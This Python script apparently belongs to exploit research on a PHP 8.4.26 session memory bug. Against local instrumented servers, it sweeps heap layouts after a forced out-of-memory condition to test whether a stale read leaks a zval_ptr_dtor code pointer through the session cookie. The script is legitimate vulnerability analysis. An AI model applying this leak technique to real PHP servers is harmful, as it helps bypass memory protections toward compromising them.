#!/usr/bin/env python3
"""Step 4 probes: does the stale read reach a code pointer?

Two measurements, both against a fresh worker pool per run (a pool is spent by
the OOM-ing producer, so reuse would measure the wrong thing):

  --mode producer   move the OOM's leftover block between size classes by
                    rewriting the *producer's* geometry. The consumer is kept
                    at the public PoC's own calibration.
  --mode offset     move the consumer's one 16-element array along the trailing
                    fields. This is the knob the PoC tuned by hand ("position
                    69").

A hit is the PoC's signature: len == 16, cookie[0:8] == 16, cookie[8:16] a code
pointer whose low 21 bits are the page offset 0x112930 (zval_ptr_dtor). That
requires PS(id) == HashTable + 0x10 (see docs/ANALYSIS.md section 10).

    ./build-instrumented.sh
    python3 step4_prodsweep.py --mode producer
    python3 step4_prodsweep.py --mode offset --producer-vs 24

`PHP_BIN` overrides the interpreter; it must be the probe-carrying build, whose
probe A prints the session id the read site actually used.
"""
import argparse
import os
import re
import signal
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import stage2 as S2          # noqa: E402

PHP = os.environ.get("PHP_BIN",
                     os.path.join(HERE, "build-instrumented", "php-8.4.26",
                                  "sapi", "cli", "php"))
WWW = os.path.join(HERE, "www")
LOGDIR = os.path.join(HERE, "logs")
DTOR_LOW21 = 0x112930

PRODUCERS = [
    ("P0-vs39", dict(depth=58, count=935, field_count=65, value_size=39)),
    ("P1-vs1", dict(depth=58, count=935, field_count=65, value_size=1)),
    ("P2-vs24", dict(depth=58, count=935, field_count=65, value_size=24)),
    ("P3-d40", dict(depth=40, count=1300, field_count=65, value_size=24)),
    ("P4-d16", dict(depth=16, count=3300, field_count=65, value_size=24)),
    ("P5-vs256", dict(depth=58, count=935, field_count=65, value_size=256)),
]
SHAPES = [
    ("C0-poc-arr69", dict(value_size=24, fields=73, array_at=69)),
    ("C1-arr-first", dict(value_size=24, fields=73, array_at=0)),
    ("C2-arr-last", dict(value_size=24, fields=73, array_at=982)),
]

A_HDR = re.compile(
    r"\[INSTR-A\] PS\(id\)=0x([0-9a-f]+) val=0x([0-9a-f]+) len=(\d+) "
    r"gc_refcount=(\d+) gc_type=0x([0-9a-f]+)")
A_BYT = re.compile(r"\[INSTR-A\] bytes\((\d+)\):(.*)")


def start_server(port, logpath):
    """Own process group: killing the master leaves forked workers holding the
    listening socket, so the next bind fails with Address already in use."""
    log = open(logpath, "wb")
    env = dict(os.environ, PHP_CLI_SERVER_WORKERS="4")
    p = subprocess.Popen(
        [PHP, "-d", "display_errors=1", "-d", "error_reporting=E_ALL",
         "-S", "127.0.0.1:%d" % port, "-t", WWW],
        stdout=log, stderr=log, env=env, start_new_session=True)
    for _ in range(80):
        time.sleep(0.25)
        try:
            S2.send(port, S2.body([S2.part(b"PHPSESSID", b"a")]))
            return p
        except OSError:
            continue
    raise SystemExit("server did not come up on %d -- see %s" % (port, logpath))


def stop_server(p):
    try:
        pgid = os.getpgid(p.pid)
    except ProcessLookupError:
        return
    for sig in (signal.SIGTERM, signal.SIGKILL):
        try:
            os.killpg(pgid, sig)
        except ProcessLookupError:
            return
        try:
            p.wait(timeout=4)
            return
        except subprocess.TimeoutExpired:
            continue


def probe_reads(path):
    """Every probe-A record in the log, oldest first."""
    try:
        lines = open(path, "rb").read().decode("utf-8", "replace").splitlines()
    except OSError:
        return []
    recs = []
    for i, line in enumerate(lines):
        m = A_HDR.search(line)
        if not m:
            continue
        dump = b""
        if i + 1 < len(lines):
            mb = A_BYT.search(lines[i + 1])
            if mb:
                dump = bytes(int(t, 16) for t in mb.group(2).split())
        recs.append(dict(addr=int(m.group(1), 16), len=int(m.group(3)),
                         refcount=int(m.group(4)), type=int(m.group(5), 16),
                         dump=dump))
    return recs


def read_verdict(rec):
    b, n = rec["dump"], rec["len"]
    if n == 32 and len(b) >= 32 and all(chr(c) in "0123456789abcdef" for c in b[:32]):
        return "healthy-id"
    if n == 16 and len(b) >= 16:
        first = int.from_bytes(b[0:8], "little")
        second = int.from_bytes(b[8:16], "little")
        if first == 16 and (second & 0x1FFFFF) == DTOR_LOW21:
            return "*** CODE-POINTER %#x ***" % second
        return "len16 first=%d second=%#x" % (first, second)
    if len(b) >= 8 and len(set(b[:8])) == 1:
        return "our-own-value (len=%d, fill %02x)" % (n, b[0])
    return "other len=%d first8=%s" % (n, b[:8].hex() or "n/a")


def wire_verdict(sid):
    if sid is None:
        return "no-cookie"
    if len(sid) == 16 and int.from_bytes(sid[0:8], "little") == 16:
        v = int.from_bytes(sid[8:16], "little")
        return "*** CODE-POINTER-WIRE %#x ***" % v
    if len(sid) == 32 and all(chr(c) in "0123456789abcdef" for c in sid):
        return "healthy-id"
    return "id len=%d %s" % (len(sid), sid[:16].hex())


def one_run(port, logpath, producer_geom, consumer_kw):
    """-> (probe verdict, wire verdict). Fresh pool, OOM, then one consumer."""
    srv = start_server(port, logpath)
    try:
        praw = S2.send(port, S2.producer(producer_geom), cookies=S2.COOKIE_PAIRS)
        _, tags = S2.classify(praw)
        if "OOM" not in " ".join(map(str, tags)):
            return "PRODUCER DID NOT OOM (%s)" % tags, "invalid"
        before = len(probe_reads(logpath))
        craw = S2.send(port, S2.consumer(**consumer_kw))
        time.sleep(0.2)
        new = probe_reads(logpath)[before:]
        last = new[-1] if new else None
        return (read_verdict(last) if last else "no consumer probe-A record",
                wire_verdict(S2.session_id(craw)))
    except OSError as exc:
        return "connection failed: %s" % exc, "invalid"
    finally:
        stop_server(srv)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["producer", "offset"], default="producer")
    ap.add_argument("--producer-vs", type=int, default=24)
    ap.add_argument("--port", type=int, default=19700)
    ap.add_argument("--step", type=int, default=4)
    ap.add_argument("--max-offset", type=int, default=160)
    args = ap.parse_args()

    os.makedirs(LOGDIR, exist_ok=True)
    port = args.port
    hits = []

    if args.mode == "producer":
        for pname, pgeom in PRODUCERS:
            print("\n--- %s %s" % (pname, pgeom), flush=True)
            for cname, ckw in SHAPES:
                port += 1
                logpath = os.path.join(LOGDIR, "prodsweep-%s-%s.log" % (pname, cname))
                v, wv = one_run(port, logpath, pgeom, ckw)
                print("  %-14s probeA=%-44s wire=%s" % (cname, v, wv), flush=True)
                if "CODE-POINTER" in v or "CODE-POINTER" in wv:
                    hits.append((pname, cname, v, wv))
    else:
        pgeom = dict(depth=58, count=935, field_count=65, value_size=args.producer_vs)
        print("producer value_size=%d, sweeping the array's trailing position\n"
              % args.producer_vs, flush=True)
        for pos in range(0, args.max_offset, args.step):
            port += 1
            logpath = os.path.join(LOGDIR, "offsweep-pos%03d.log" % pos)
            ckw = dict(value_size=24, fields=73, array_at=pos,
                       array_len=16, array_value=16)
            v, wv = one_run(port, logpath, pgeom, ckw)
            if "CODE-POINTER" in v or "CODE-POINTER" in wv:
                hits.append((pos, v, wv))
                print("*** HIT pos=%d probeA=%s wire=%s" % (pos, v, wv), flush=True)
            else:
                print("pos=%3d probeA=%-46s wire=%s" % (pos, v, wv), flush=True)

    print("\n=== %d hit(s) ===" % len(hits))
    for h in hits:
        print("  %s" % (h,))


if __name__ == "__main__":
    main()
